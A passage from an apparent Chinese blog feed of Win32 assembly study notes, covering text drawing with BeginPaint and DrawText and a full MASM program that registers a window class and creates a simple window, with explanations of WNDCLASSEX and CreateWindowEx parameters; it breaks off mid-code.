ADDR rect， \ </span><br><span class="line">DT_SINGLELINE or DT_CENTER or DT_VCENTER</span><br><span class="line">invoke EndPaint，hWnd， ADDR ps</span><br></pre></td></tr></table></figure><p>在处理 <code>WM_PAINT</code> 消息时，您调用<code>BeginPaint</code>函数，传给它一个窗口句柄和未初始化的 <code>PAINTSTRUCT</code> 型参数。调用成功后在 eax 中返回“设备环境”的句柄。下一次，调用 <code>GetClientRect</code> 以得到客户区的大小，大小放在 <code>rect</code> 中，然后把它传给 <code>DrawText</code>。<code>DrawText</code> 的语法如下： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DrawText proto hdc：HDC， lpString：DWORD， nCount：DWORD， lpRect：DWORD， uFormat：DWORD</span><br></pre></td></tr></table></figure><p><code>DrawText</code>是一个高层的调用函数。它能自动处理像换行、把文本放到客户区中间等这些杂事。所以您只管集中精力“绘制”字符串就可以了。让我们来看一看该函数的参数： </p><ul><li><code>hdc</code>： “设备环境”的句柄。 </li><li><code>lpString</code>：要显示的文本串，该文本串要么以NULL结尾，要么在nCount中指出它的长短。 </li><li><code>nCount</code>：要输出的文本的长度。若以NULL结尾，该参数必须是-1。 </li><li><code>lpRect</code>： 指向要输出文本串的正方形区域的指针，该方形必须是一个裁剪区，也就是说超过该区域的字符将不能显示。 </li><li><code>uFormat</code>：指定如何显示。我们可以用 or 把以下标志或到一块： <ul><li>DT_SINGLELINE：是否单行显示。 </li><li>DT_CENTER：是否水平居中。 </li><li>DT_VCENTER ：是否垂直居中。 </li></ul></li></ul><p>结束绘制后，必须调用 <code>EndPaint</code> 释放“设备环境”的句柄。 好了，现在我们把“绘制”文本串的要点总结如下：</p><ol><li>必须在开始和结束处分别调用 <code>BeginPaint</code> 和 <code>EndPaint</code>； </li><li>在 <code>BeginPaint</code> 和 <code>EndPaint</code> 之间调用所有的绘制函数； </li><li>如果在其它的消息处理中重新绘制客户区，您可以有两种选择：<ul><li>用<code>GetDC</code>和<code>ReleaseDC</code>代替<code>BeginPaint</code>和<code>EndPaint</code>；</li><li>调用<code>InvalidateRect</code>或<code>UpdateWindow</code>让客户区无效，这将迫使WINDOWS把<code>WM_PAINT</code>放入应用程序消息队列，从而使得客户区重绘。</li></ul></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次，我们将学习如何在窗口的客户区“绘制”字符串。我们还将学习关于“设备环境”的概念。&lt;br&gt;
    
    </summary>
    
      <category term="汇编(ASM)" scheme="http://hacktech.cn/categories/%E6%B1%87%E7%BC%96-ASM/"/>
    
    
      <category term="ASM" scheme="http://hacktech.cn/tags/ASM/"/>
    
      <category term="读书笔记" scheme="http://hacktech.cn/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
      <category term="Windows" scheme="http://hacktech.cn/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>Win32汇编学习(3)：简单的窗口</title>
    <link href="http://hacktech.cn/2018/02/06/Win32%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0-3-%EF%BC%9A%E7%AE%80%E5%8D%95%E7%9A%84%E7%AA%97%E5%8F%A3.html"/>
    <id>http://hacktech.cn/2018/02/06/Win32汇编学习-3-：简单的窗口.html</id>
    <published>2018-02-06T13:12:50.000Z</published>
    <updated>2018-09-08T06:50:11.307Z</updated>
    
    <content type="html"><![CDATA[<p>这次我们将写一个 Windows 程序，它会在桌面显示一个标准的窗口，以此根据代码来学习如何创建一个简单的窗口。<br><a id="more"></a></p><h2 id="理论："><a href="#理论：" class="headerlink" title="理论："></a>理论：</h2><p>Windows 程序中，在写图形用户界面时需要调用大量的标准 Windows Gui 函数。其实这对用户和程序员来说都有好处，对于用户，面对的是同一套标准的窗口，对这些窗口的操作都是一样的，所以使用不同的应用程序时无须重新学习操作。对程序员来说，这些 Gui 源代码都是经过了微软的严格测试，随时拿来就可以用的。当然至于具体地写程序对于程序员来说还是有难度的。为了创建基于窗口的应用程序，必须严格遵守规范。做到这一点并不难，只要用模块化或面向对象的编程方法即可。</p><p>下面我就列出在桌面显示一个窗口的几个步骤：</p><ol><li>得到您应用程序的句柄(必需)； </li><li>得到命令行参数(如果您想从命令行得到参数，可选)； </li><li>注册窗口类(必需，除非您使用 Windows 预定义的窗口类，如 MessageBox 或 dialog box； </li><li>产生窗口(必需)； </li><li>在桌面显示窗口(必需，除非您不想立即显示它)； </li><li>刷新窗口客户区； </li><li>进入无限的获取窗口消息的循环； </li><li>如果有消息到达，由负责该窗口的窗口回调函数处理； </li><li>如果用户关闭窗口，进行退出处理。 </li></ol><p>相对于单用户的 DOS 下的编程来说，Windows 下的程序框架结构是相当复杂的。但是 Windows 和 DOS 在系统架构上是截然不同的。Windows 是一个多任务的操作系统，故系统中同时有多个应用程序彼此协同运行。这就要求 Windows 程序员必须严格遵守编程规范，并养成良好的编程风格。</p><h2 id="内容："><a href="#内容：" class="headerlink" title="内容："></a>内容：</h2><p>下面是我们简单的窗口程序的源代码。在进入复杂的代码前，指出几点要点：</p><ul><li>您应当把程序中要用到的所有常量和结构体的声明放到一个头文件中，并且在源程序的开始处包含这个头文件。这么做将会节省您大量的时间，也免得一次又一次的敲键盘。目前，我所使用的是<a href="http://masm32.com/" target="_blank" rel="noopener">masm32.com</a>提供的。您也可以定义您自己的常量和结构体，但最好把它们放到独立的头文件中 </li><li>用 includelib 指令，包含您的程序要引用的库文件，譬如：若您的程序要调用 “MessageBox”， 您就应当在源文件中加入如下一行： includelib user32.lib 这条语句告诉 MASM 您的程序将要用到一些引入库。如果您不止引用一个库，只要简单地加入 includelib 语句，不要担心链接器如何处理这么多的库，只要在链接时用链接开关 /LIBPATH 指明库所在的路径即可。 </li><li>在其它地方运用头文件中定义函数原型，常数和结构体时，要严格保持和头文件中的定义一致，包括大小写。在查询函数定义时，这将节约您大量的时间； </li><li>在编译，链接时用makefile文件，免去重复敲键。 </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">.386 </span><br><span class="line">.model flat,stdcall </span><br><span class="line">option casemap:none </span><br><span class="line">include windows.inc </span><br><span class="line">include user32.inc </span><br><span class="line">includelib user32.lib            ; calls to functions in user32.lib and kernel32.lib </span><br><span class="line">include kernel32.inc </span><br><span class="line">includelib kernel32.lib </span><br><span class="line"></span><br><span class="line">WinMain proto :DWORD,:DWORD,:DWORD,:DWORD </span><br><span class="line"></span><br><span class="line">.DATA                     ; initialized data </span><br><span class="line">ClassName db &quot;SimpleWinClass&quot;,0        ; the name of our window class </span><br><span class="line">AppName db &quot;Our First Window&quot;,0        ; the name of our window </span><br><span class="line"></span><br><span class="line">.DATA?                ; Uninitialized data </span><br><span class="line">hInstance HINSTANCE ?        ; Instance handle of our program </span><br><span class="line">CommandLine LPSTR ? </span><br><span class="line">.CODE                ; Here begins our code </span><br><span class="line">start: </span><br><span class="line">invoke GetModuleHandle, NULL            ; get the instance handle of our program. </span><br><span class="line">                                                                       ; Under Win32, hmodule==hinstance mov hInstance,eax </span><br><span class="line">mov hInstance,eax </span><br><span class="line">invoke GetCommandLine                        ; get the command line. You don&apos;t have to call this function IF </span><br><span class="line">                                                                       ; your program doesn&apos;t process the command line. </span><br><span class="line">mov CommandLine,eax </span><br><span class="line">invoke WinMain, hInstance,NULL,CommandLine, SW_SHOWDEFAULT        ; call the main function </span><br><span class="line">invoke ExitProcess, eax                           ; quit our program. The exit code is returned in eax from WinMain. </span><br><span class="line"></span><br><span class="line">WinMain proc hInst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD </span><br><span class="line">    LOCAL wc:WNDCLASSEX                                            ; create local variables on stack </span><br><span class="line">    LOCAL msg:MSG </span><br><span class="line">    LOCAL hwnd:HWND </span><br><span class="line"></span><br><span class="line">    mov   wc.cbSize,SIZEOF WNDCLASSEX                   ; fill values in members of wc </span><br><span class="line">    mov   wc.style, CS_HREDRAW or CS_VREDRAW </span><br><span class="line">    mov   wc.lpfnWndProc, OFFSET WndProc </span><br><span class="line">    mov   wc.cbClsExtra,NULL </span><br><span class="line">    mov   wc.cbWndExtra,NULL </span><br><span class="line">    push  hInstance </span><br><span class="line">    pop   wc.hInstance </span><br><span class="line">    mov   wc.hbrBackground,COLOR_WINDOW+1 </span><br><span class="line">    mov   wc.lpszMenuName,NULL </span><br><span class="line">    mov   wc.lpszClassName,OFFSET ClassName </span><br><span class="line">    invoke LoadIcon,NULL,IDI_APPLICATION </span><br><span class="line">    mov   wc.hIcon,eax </span><br><span class="line">    mov   wc.hIconSm,eax </span><br><span class="line">    invoke LoadCursor,NULL,IDC_ARROW </span><br><span class="line">    mov   wc.hCursor,eax </span><br><span class="line">    invoke RegisterClassEx, addr wc                       ; register our window class </span><br><span class="line">    invoke CreateWindowEx,NULL,\ </span><br><span class="line">                ADDR ClassName,\ </span><br><span class="line">                ADDR AppName,\ </span><br><span class="line">                WS_OVERLAPPEDWINDOW,\ </span><br><span class="line">                CW_USEDEFAULT,\ </span><br><span class="line">                CW_USEDEFAULT,\ </span><br><span class="line">                CW_USEDEFAULT,\ </span><br><span class="line">                CW_USEDEFAULT,\ </span><br><span class="line">                NULL,\ </span><br><span class="line">                NULL,\ </span><br><span class="line">                hInst,\ </span><br><span class="line">                NULL </span><br><span class="line">    mov   hwnd,eax </span><br><span class="line">    invoke ShowWindow, hwnd,CmdShow               ; display our window on desktop </span><br><span class="line">    invoke UpdateWindow, hwnd                                 ; refresh the client area </span><br><span class="line"></span><br><span class="line">    .WHILE TRUE                                                         ; Enter message loop </span><br><span class="line">                invoke GetMessage, ADDR msg,NULL,0,0 </span><br><span class="line">                .BREAK .IF (!eax) </span><br><span class="line">                invoke TranslateMessage, ADDR msg </span><br><span class="line">                invoke DispatchMessage, ADDR msg </span><br><span class="line">   .ENDW </span><br><span class="line">    mov     eax,msg.wParam                                            ; return exit code in eax </span><br><span class="line">    ret </span><br><span class="line">WinMain endp </span><br><span class="line"></span><br><span class="line">WndProc proc hWnd:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM </span><br><span class="line">    .IF uMsg==WM_DESTROY                           ; if the user closes our window </span><br><span class="line">        invoke PostQuitMessage,NULL             ; quit our application </span><br><span class="line">    .ELSE </span><br><span class="line">        invoke DefWindowProc,hWnd,uMsg,wParam,lParam     ; Default message processing </span><br><span class="line">        ret </span><br><span class="line">    .ENDIF </span><br><span class="line">    xor eax,eax </span><br><span class="line">    ret </span><br><span class="line">WndProc endp </span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><p>看到一个简单的 Windows 程序有这么多行，您是不是有点想死? 但是您必须要知道的是上面的大多数代码都是模板而已，模板的意思即是指这些代码对差不多所有标准 Windows 程序来说都是相同的。在写 Windows 程序时您可以把这些代码拷来拷去，当然把这些重复的代码写到一个库中也挺好。其实真正要写的代码集中在 WinMain 中。这和一些 C 编译器一样，无须要关心其它杂务，集中精力于 WinMain 函数。<strong>唯一不同的是 C 编译器要求您的源代码有必须有一个函数叫 WinMain。否则 C 无法知道将哪个函数和有关的前后代码链接。相对C，汇编语言提供了较大的灵活性，它不强行要求一个叫 WinMain 的函数。</strong></p><p>做好心理准备，下面我们开始分析代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat，stdcall</span><br><span class="line">option casemap：none</span><br><span class="line"></span><br><span class="line">WinMain proto ：DWORD，：DWORD，：DWORD，：DWORD</span><br><span class="line"></span><br><span class="line">include windows.inc</span><br><span class="line">include user32.inc</span><br><span class="line">include kernel32.inc</span><br><span class="line">includelib user32.lib</span><br><span class="line">includelib kernel32.lib</span><br></pre></td></tr></table></figure><p>您可以把前三行看成是”必须”的.</p><p><code>.386</code>告诉MASN我们要用80386指令集。<br><code>. model flat，stdcall</code>告诉MASM 我们用的内存寻址模式，此处也可以加入stdcall告诉MASM我们所用的参数传递约定。  </p><p>接下来是函数 WinMain 的原型声明，因为我们稍后要用到该函数，故必须先声明。我们必须包含 window.inc 文件，因为其中包含大量要用到的常量和结构的定义，该文件是一个文本文件，您可以用任何文本编辑器打开并且查看它</p><p>我们的程序调用 user32.dll (譬如：CreateWindowEx， RegisterWindowClassEx) 和 kernel32.dll (ExitProcess)中的函数，所以必须链接这两个库。接下来我如果问：您需要把什么库链入您的程序呢 ? 答案是：先查到您要调用的函数在什么库中，然后包含进来。譬如：若您要调用的函数在 gdi32.dll 中，您就要包含gdi32.inc头文件。和 MASM 相比，TASM 则要简单得多，您只要引入一个库，即：import32.lib。&lt;但 Tasm5 麻烦的是 windows.inc 非常的不全面，而且如果在 Windows.inc 中包含全部的 API 定义会内存不够，所以每次你得把用到的 API 定义拷贝出来&gt;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.DATA</span><br><span class="line"></span><br><span class="line">ClassName db &quot;SimpleWinClass&quot;，0 </span><br><span class="line">AppName db &quot;Our First Window&quot;，0</span><br><span class="line"></span><br><span class="line">.DATA?</span><br><span class="line"></span><br><span class="line">hInstance HINSTANCE ?</span><br><span class="line">CommandLine LPSTR ?</span><br></pre></td></tr></table></figure><p>接下来是<code>DATA</code>“分段”。 在 .DATA 中我们定义了两个以 NULL 结尾的字符串 (ASCIIZ)：其中 ClassName 是 Windows 类名，AppName 是我们窗口的名字。这两个变量都是初始化了的。未进行初始化的两个变量放在 <code>.DATA?</code> “分段”中，其中 hInstance 代表应用程序的句柄，CommandLine 保存从命令行传入的参数。HINSTACE 和 LPSTR 是两个数据类型名，它们在头文件中定义，可以看做是 DWORD 的别名，之所以要这么重新定仅是为了易记。您可以查看 windows.inc 文件，在 .DATA? 中的变量都是未经初始化的，这也就是说在程序刚启动时它们的值是什么无关紧要，只不过占有了一块内存，以后可以再利用而已。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.CODE</span><br><span class="line">start：</span><br><span class="line">invoke GetModuleHandle， NULL</span><br><span class="line">mov hInstance，eax</span><br><span class="line">invoke GetCommandLine</span><br><span class="line">mov CommandLine，eax</span><br><span class="line">invoke WinMain， hInstance，NULL，CommandLine， SW_SHOWDEFAULT</span><br><span class="line">invoke ExitProcess，eax</span><br><span class="line">.....</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p><code>.CODE</code> “分段”包含了您应用程序的所有代码，这些代码必须都在 .code 和 end 之间。至于 label 的命名只要遵从 Windows 规范而且保证唯一则具体叫什么倒是无所谓。我们程序的第一条语句是调用 GetModuleHandle 去查找我们应用程序的句柄。在Win32下，应用程序的句柄和模块的句柄是一样的。您可以把实例句柄看成是您的应用程序的 ID 号。我们在调用几个函数是都把它作为参数来进行传递，所以在一开始便得到并保存它就可以省许多的事。</p><p>特别注意：WIN32下的实例句柄实际上是您应用程序在内存中的线性地址。</p><p><strong>WIN32 中函数的函数如果有返回值，那它是通过 eax 寄存器来传递的。其他的值可以通过传递进来的参数地址进行返回。</strong>一个 WIN32 函数被调用时总会保存好段寄存器和 ebx，edi，esi和ebp 寄存器，而 ecx和edx 中的值总是不定的，不能在返回时应用。特别注意：从 Windows API 函数中返回后，eax，ecx，edx 中的值和调用前不一定相同。当函数返回时，返回值放在eax中。如果您应用程序中的函数提供给 Windows 调用时，也必须遵守这一点，即在函数入口处保存段寄存器和 ebx，esp，esi，edi 的值并在函数返回时恢复。如果不这样一来的话，您的应用程序很快会崩溃。从您的程序中提供给 Windows 调用的函数大体上有两种：Windows 窗口过程和 Callback 函数。</p><p>如果您的应用程序不处理命令行那么就无须调用 GetCommandLine，这里只是告诉您如果要调用应该怎么做。 </p><p>下面则是调用WinMain了。该函数共有4个参数：应用程序的实例句柄，该应用程序的前一实例句柄，命令行参数串指针和窗口如何显示。Win32 没有前一实例句柄的概念，所以第二个参数总为0。之所以保留它是为了和 Win16 兼容的考虑，在 Win16下，如果 hPrevInst 是 NULL，则该函数是第一次运行。特别注意：您不用必须声明一个名为 WinMain 函数，事实上在这方面您可以完全作主，您甚至无须有一个和 WinMain 等同的函数。您只要把 WinMain 中的代码拷到GetCommandLine 之后，其所实现的功能完全相同。在 WinMain 返回时，把返回码放到 eax 中。然后在应用程序结束时通过 ExitProcess 函数把该返回码传递给 Windows 。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WinMain proc Inst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD</span><br></pre></td></tr></table></figure><p>上面是WinMain的定义。注意跟在 proc 指令后的parameter：type形式的参数，它们是由调用者传给 WinMain 的，我们引用是直接用参数名即可。至于压栈和退栈时的平衡堆栈工作由 MASM 在编译时加入相关的前序和后序汇编指令来进行。 <code>LOCAL wc：WNDCLASSEX LOCAL msg：MSG LOCAL hwnd：HWND LOCAL</code> 伪指令为局部变量在栈中分配内存空间，所有的 LOCAL 指令必须紧跟在 PROC 之后。LOCAL 后跟声明的变量，其形式是 变量名:变量类型。譬如 <code>LOCAL wc：WNDCLASSEX</code> 即是告诉 MASM 为名字叫 wc 的局部边量在栈中分配长度为 WNDCLASSEX 结构体长度的内存空间，然后我们在用该局部变量是无须考虑堆栈的问题，考虑到 DOS 下的汇编，这不能不说是一种恩赐。不过这就要求这样声明的局部变量在函数结束时释放栈空间，(也即不能在函数体外被引用)，另一个缺点是您因不能初始化您的局部变量，不得不在稍后另外再对其赋值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mov wc.cbSize，SIZEOF WNDCLASSEX</span><br><span class="line">mov wc.style， CS_HREDRAW or CS_VREDRAW</span><br><span class="line">mov wc.lpfnWndProc， OFFSET WndProc</span><br><span class="line">mov wc.cbClsExtra，NULL</span><br><span class="line">mov wc.cbWndExtra，NULL</span><br><span class="line">push hInstance</span><br><span class="line">pop wc.hInstance</span><br><span class="line">mov wc.hbrBackground，COLOR_WINDOW+1 </span><br><span class="line">mov wc.lpszMenuName，NULL</span><br><span class="line">mov wc.lpszClassName，OFFSET ClassName </span><br><span class="line">invoke LoadIcon，NULL，IDI_APPLICATION</span><br><span class="line">mov wc.hIcon，eax</span><br><span class="line">mov wc.hIconSm，eax</span><br><span class="line">invoke LoadCursor，NULL，IDC_ARROW</span><br><span class="line">mov wc.hCursor，eax invoke </span><br><span class="line">RegisterClassEx， addr w</span><br></pre></td></tr></table></figure><p>上面几行从概念上说确实是非常地简单。只要几行指令就可以实现。其中的主要概念就是窗口类（window class），一个窗口类就是一个有关窗口的规范，这个规范定义了几个主要的窗口的元素，如：图标、光标、背景色、和负责处理该窗口的函数。您产生一个窗口时就必须要有这样的一个窗口类。如果您要产生不止一个同种类型的窗口时，最好的方法就是把这个窗口类存储起来，这种方法可以节约许多的内存空间。也许今天您不会太感觉到，可是想想以前 PC 大多数只有 1M 内存时，这么做是非常有必要的。如果您要定义自己的创建窗口类就必须：在一个 WINDCLASS 或 WINDOWCLASSEXE 结构体中指明您窗口的组成元素，然后调用 RegisterClass 或 RegisterClassEx ，再根据该窗口类产生窗口。对不同特色的窗口必须定义不同的窗口类。 WINDOWS有几个预定义的窗口类，譬如：按钮、编辑框等。要产生该种风格的窗口无须预先再定义窗口类了，只要包预定义类的类名作为参数调用 CreateWindowEx 即可。</p><p>WNDCLASSEX 中最重要的成员莫过于lpfnWndProc了。前缀 lpfn 表示该成员是一个指向函数的长指针。在 Win32中由于内存模式是 FLAT 型，所以没有 near 或 far 的区别。每一个窗口类必须有一个窗口过程，当 Windows 把属于特定窗口的消息发送给该窗口时，该窗口的窗口类负责处理所有的消息，如键盘消息或鼠标消息。由于窗口过程差不多智能地处理了所有的窗口消息循环，所以您只要在其中加入消息处理过程即可。下面我将要讲解 WNDCLASSEX 的每一个成员</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">WNDCLASSEX STRUCT DWORD </span><br><span class="line">  cbSize            DWORD      ? </span><br><span class="line">  style             DWORD      ? </span><br><span class="line">  lpfnWndProc       DWORD      ? </span><br><span class="line">  cbClsExtra        DWORD      ? </span><br><span class="line">  cbWndExtra        DWORD      ? </span><br><span class="line">  hInstance         DWORD      ? </span><br><span class="line">  hIcon             DWORD      ? </span><br><span class="line">  hCursor           DWORD      ? </span><br><span class="line">  hbrBackground     DWORD      ? </span><br><span class="line">  lpszMenuName      DWORD      ? </span><br><span class="line">  lpszClassName     DWORD      ? </span><br><span class="line">  hIconSm           DWORD      ? </span><br><span class="line">WNDCLASSEX ENDS</span><br></pre></td></tr></table></figure><ul><li><code>cbSize</code>：WNDCLASSEX 的大小。我们可以用sizeof（WNDCLASSEX）来获得准确的值。 </li><li><code>style</code>：从这个窗口类派生的窗口具有的风格。您可以用“or”操作符来把几个风格或到一起。 </li><li><code>lpfnWndProc</code>：窗口处理函数的指针。 </li><li><code>cbClsExtra</code>：指定紧跟在窗口类结构后的附加字节数。 </li><li><code>cbWndExtra</code>：指定紧跟在窗口事例后的附加字节数。如果一个应用程序在资源中用CLASS伪指令注册一个对话框类时，则必须把这个成员设成DLGWINDOWEXTRA。 </li><li><code>hInstance</code>：本模块的事例句柄。 </li><li><code>hIcon</code>：图标的句柄。 </li><li><code>hCursor</code>：光标的句柄。 </li><li><code>hbrBackground</code>：背景画刷的句柄。 </li><li><code>lpszMenuName</code>：指向菜单的指针。 </li><li><code>lpszClassName</code>：指向类名称的指针。 </li><li><code>hIconSm</code>：和窗口类关联的小图标。如果该值为NULL。则把hCursor中的图标转换成大小合适的小图标。 </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">invoke CreateWindowEx， NULL，\</span><br><span class="line">ADDR ClassName，\</span><br><span class="line">ADDR AppName，\</span><br><span class="line">WS_OVERLAPPEDWINDOW，\</span><br><span class="line">CW_USEDEFAULT，\</span><br><span class="line">CW_USEDEFAULT，\</span><br><span class="line">CW_USEDEFAULT，\</span><br><span class="line">CW_USEDEFAULT，\ </span><br><span class="line">NULL，\ </span><br><span class="line">NULL，\</span><br><span class="line">hInst，\</span><br><span class="line">NULL</span><br></pre></td></tr></table></figure><p>注册窗口类后，我们将调用<code>CreateWindowEx</code>来产生实际的窗口。请注意该函数有12个参数。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">CreateWindowExA proto dwExStyle：DWORD，\</span><br><span class="line">lpClassName：DWORD，\</span><br><span class="line">lpWindowName：DWORD，\ </span><br><span class="line">dwStyle：DWORD，\</span><br><span class="line">X：DWORD，\</span><br><span class="line">Y：DWORD，\</span><br><span class="line">nWidth：DWORD，\</span><br><span class="line">nHeight：DWORD，\</span><br><span class="line">hWndParent：DWORD ，\</span><br><span class="line">hMenu：DWORD，\ </span><br><span class="line">hInstance：DWORD，\</span><br><span class="line">lpParam：DWORD</span><br></pre></td></tr></table></figure><p>我们来仔细看一看这些的参数：</p><ul><li><code>dwExStyle</code>：附加的窗口风格。相对于旧的CreateWindow这是一个新的参数。在9X/NT中您可以使用新的窗口风格。您可以在Style中指定一般的窗口风格，但是一些特殊的窗口风格，如顶层窗口则必须在此参数中指定。如果您不想指定任何特别的风格，则把此参数设为NULL。 </li><li><code>lpClassName</code>：（必须）。ASCIIZ形式的窗口类名称的地址。可以是您自定义的类，也可以是预定义的类名。像上面所说，每一个应用程序必须有一个窗口类。 </li><li><code>lpWindowName</code>：ASCIIZ形式的窗口名称的地址。该名称会显示在标题条上。如果该参数空白，则标题条上什么都没有。 </li><li><code>dwStyle</code>：窗口的风格。在此您可以指定窗口的外观。可以指定该参数为零，但那样该窗口就没有系统菜单，也没有最大化和最小化按钮，也没有关闭按钮，那样您不得不按Alt+F4 来关闭它。最为普遍的窗口类风格是 <code>WS_OVERLAPPEDWINDOW</code>。 一种窗口风格是一种按位的掩码，这样您可以用<code>or</code>把您希望的窗口风格或起来。像 <code>WS_OVERLAPPEDWINDOW</code> 就是由几种最为普遍的风格<code>or</code>起来的。 </li><li><code>X</code>，<code>Y</code>： 指定窗口左上角的以像素为单位的屏幕坐标位置。缺省地可指定为 <code>CW_USEDEFAULT</code>，这样 Windows 会自动为窗口指定最合适的位置。 </li><li><code>nWidth</code>，<code>nHeight</code>： 以像素为单位的窗口大小。缺省地可指定为 <code>CW_USEDEFAULT</code>，这样 Windows 会自动为窗口指定最合适的大小。 </li><li><code>hWndParent</code>： 父窗口的句柄（如果有的话）。这个参数告诉 Windows 这是一个子窗口和他的父窗口是谁。这和 MDI（多文档结构）不同，此处的子窗口并不会局限在父窗口的客户区内。他只是用来告诉 Windows 各个窗口之间的父子关系，以便在父窗口销毁是一同把其子窗口销毁。在我们的例子程序中因为只有一个窗口，故把该参数设为 NULL。 </li><li><code>hMenu</code>： WINDOWS菜单的句柄。如果只用系统菜单则指定该参数为NULL。回头看一看<code>WNDCLASSEX</code> 结构中的 <code>lpszMenuName</code> 参数，它也指定一个菜单，这是一个缺省菜单，任何从该窗口类派生的窗口若想用其他的菜单需在该参数中重新指定。其实该参数有双重意义：一方面若这是一个自定义窗口时该参数代表菜单句柄，另一方面，若这是一个预定义窗口时，该参数代表是该窗口的 ID 号。Windows 是根据<code>lpClassName</code> 参数来区分是自定义窗口还是预定义窗口的。 </li><li><code>hInstance</code>： 产生该窗口的应用程序的实例句柄。 </li><li><code>lpParam</code>： （可选）指向欲传给窗口的结构体数据类型参数的指针。如在MDI中在产生窗口时传递 CLIENTCREATESTRUCT 结构的参数。一般情况下，该值总为零，这表示没有参数传递给窗口。可以通过GetWindowLong 函数检索该值。 </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov hwnd，eax</span><br><span class="line">invoke ShowWindow， 